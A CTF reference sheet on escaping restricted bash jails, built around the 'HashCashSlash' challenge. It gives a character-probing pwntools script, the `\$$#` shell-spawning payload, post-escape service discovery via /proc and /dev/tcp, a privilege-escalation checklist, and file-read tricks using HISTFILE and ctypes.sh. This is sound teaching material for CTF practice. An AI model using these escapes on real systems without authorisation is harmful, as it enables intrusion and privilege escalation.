# CTF Misc - Bash Jails & Restricted Shells

## Table of Contents
- [Identifying the Jail](#identifying-the-jail)
- [Eval Context Detection](#eval-context-detection)
- [Character-Restricted Bash: Only #, $, \](#character-restricted-bash-only---)
- [Internal Service Discovery (Post-Shell)](#internal-service-discovery-post-shell)
- [Other Restricted Character Set Tricks](#other-restricted-character-set-tricks)
  - [Building numbers from $# and ${##}](#building-numbers-from--and-)
  - [Using PID digits](#using-pid-digits)
  - [Octal in ANSI-C quoting](#octal-in-ansi-c-quoting)
  - [Dollar-zero variants](#dollar-zero-variants)
- [Privilege Escalation Checklist (Post-Shell)](#privilege-escalation-checklist-post-shell)
- [HISTFILE Trick for Restricted Shell File Reads (BCTF 2016)](#histfile-trick-for-restricted-shell-file-reads-bctf-2016)
- [References](#references)

---

## Identifying the Jail

**Methodology:** Send test inputs and observe error messages to determine:
1. What characters are allowed (whitelist vs blacklist)
2. Whether input is `eval`'d, passed to `bash -c`, or something else
3. Whether input is wrapped in quotes (double-quoted eval context)

**Test for character filtering:**
```python
from pwn import *
import time

# Send each char combined with a known-good payload
for c in range(32, 127):
    r = remote(host, port, level='error')
    r.sendline(b'$#' + bytes([c]) + b'$#')
    time.sleep(0.3)
    try:
        data = r.recv(timeout=1)
        if data:
            print(f'{chr(c)!r}: {data.decode().strip()[:60]}')
    except:
        pass
    r.close()
```

**Silent rejection = character not allowed.** Error output = character passed the filter.

**Key insight:** Systematically probe each printable character to map the allowed set before crafting payloads. Silent rejection means the character is filtered; any error output means it passed the filter and reached the shell.

---

## Eval Context Detection

**Double-quoted eval** (`eval "$input"`):
- Trailing `\` causes: `unexpected EOF while looking for matching '"'`
- `$#` expands to `0` (inside double-quotes, `$` still expands)
- `\$` gives literal `$` (backslash escapes dollar in double-quotes)
- `\#` gives `\#` literally (backslash doesn't escape `#` in double-quotes, but eval then interprets `\#` as literal `#`)

**Bare eval** (`eval $input`):
- Word splitting applies
- Backslash escapes work differently

**Read behavior:**
- `read -r`: backslashes preserved literally
- `read` (without -r): backslash is escape character (strips backslashes)

**Key insight:** Distinguish between `eval "$input"` (double-quoted) and `eval $input` (bare) by sending a trailing backslash. Double-quoted eval produces an "unexpected EOF" error because the backslash escapes the closing quote; bare eval does not. This determines which escape sequences are available for exploitation.

---

## Character-Restricted Bash: Only `#`, `$`, `\`

**Pattern (HashCashSlash):** Filter regex `^[\\#\$]+$` allows only hash, dollar, backslash.

**Available expansions:**
| Construct | Result | Notes |
|-----------|--------|-------|
| `$#` | `0` | Number of positional parameters |
| `$$` | PID | Current process ID (multi-digit number) |
| `\$` | literal `$` | In double-quoted eval context |
| `\\` | literal `\` | In double-quoted eval context |
| `\#` | literal `#` | Via eval's second-pass interpretation |

**Key payload: `\$$#`**

In a double-quoted eval context like `bash -c "\"${x}\""`:
- `\$` → literal `$` (backslash escapes dollar in double-quotes)
- `$#` → `0` (parameter expansion)
- Combined: `$0` in the eval context
- `$0` = the shell name = `bash`
- Result: **spawns an interactive bash shell**

**Why it works:** The script wraps input in double quotes for `bash -c`, so `\$` becomes a literal `$`, then `$#` expands to `0`, giving the string `$0`. When eval executes this, `$0` expands to the shell invocation name (`bash`), spawning a new shell.

---

## Internal Service Discovery (Post-Shell)

After escaping the jail, the flag may not be directly readable. Check for internal services:

```bash
# Find all running processes and their command lines
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' '

# Look specifically for flag-serving processes
for pid in /proc/[0-9]*/; do
    cmd=$(cat ${pid}cmdline 2>/dev/null | tr '\0' ' ')
    if echo "$cmd" | grep -qi flag; then
        echo "PID $(basename $pid): $cmd"
        cat ${pid}status 2>/dev/null | grep -E "^(Uid|Name):"
    fi
done
```

**Common patterns:**
- `socat TCP-LISTEN:PORT,bind=127.0.0.1 EXEC:cat /flag` → flag on localhost port
- `readflag` binary with SUID bit
- Flag in environment of root process

**Connect to internal services:**
```bash
# Bash built-in TCP (no netcat needed)
cat < /dev/tcp/127.0.0.1/PORT

# Or with netcat if available
nc 127.0.0.1 PORT
```

**Key insight:** After escaping the jail, check `/proc/*/cmdline` for internal services serving the flag on localhost. The flag is often on a different process, not readable from the filesystem directly.

---

## Other Restricted Character Set Tricks

### Building numbers from `$#` and `${##}`
If `{` and `}` are allowed:
- `$#` = 0
- `${##}` = 1 (length of `$#`'s string value "0")
- Concatenate to build binary: `${##}$#${##}` = "101"

### Using PID digits
`$$` gives a multi-digit number. If you can extract individual digits (requires `{}` and `:`):
```bash
${$$:0:1}  # First digit of PID
${$$:1:1}  # Second digit of PID
```

### Octal in ANSI-C quoting
If `'` is available: `$'\101'` = `A`, `$'\142\141\163\150'` = `bash`

### Dollar-zero variants
| Shell | `$0` value |
|-------|-----------|
| bash script | script path |
| bash -c | `bash` |
| interactive | `bash` or `-bash` |
| sh | `sh` |

**Key insight:** Build arbitrary strings from minimal character sets by combining `$#` (yields 0), `${##}` (yields 1), `$$` (PID digits), and ANSI-C quoting (`$'\NNN'` for octal). Even a 3-character alphabet (`#$\`) is sufficient to spawn a shell via `$0` expansion.

---

## Privilege Escalation Checklist (Post-Shell)

1. **SUID binaries:** `find / -perm -4000 2>/dev/null`
2. **Capabilities:** `find / -executable -type f -exec getcap {} \; 2>/dev/null`
3. **Internal services:** Check `/proc/*/cmdline` for flag-serving daemons
4. **Process UIDs:** `cat /proc/*/status 2>/dev/null | grep -A5 "^Name:.*flag"`
5. **Writable paths:** Check if PATH contains writable dirs
6. **Docker/container:** `/dev/tcp` for internal service access, `/.dockerenv` presence

**Key insight:** After escaping the jail, run through this checklist in order: SUID binaries and capabilities first (quickest wins), then internal services via `/proc/*/cmdline`, then writable PATH directories. In containers, use `/dev/tcp` for internal service access since netcat is rarely available.

---

## HISTFILE Trick for Restricted Shell File Reads (BCTF 2016)

Read arbitrary files in restricted bash shells without cat/less/head:

```bash
# Method 1: HISTFILE loading
HISTFILE=/path/to/flag /bin/bash
history  # Flag contents loaded as command history

# Method 2: bash verbose mode
bash -v flag.txt  # Prints each line before executing; comments (#flag{...}) print without error

# Method 3: ctypes.sh direct C library calls
dlcall -n fd open /flag 0
dlcall -n m mmap 0 100 1 1 $fd 0
dlcall printf %s $m
```

**Key insight:** Three ways to read files without standard utilities: (1) HISTFILE loading, (2) `bash -v` verbose mode, (3) `ctypes.sh` direct C library calls via `dlcall`.

---

## References

- 0xL4ugh CTF "HashCashSlash": Filter `^[\\#\$]+$`, payload `\$$#`, internal socat flag service
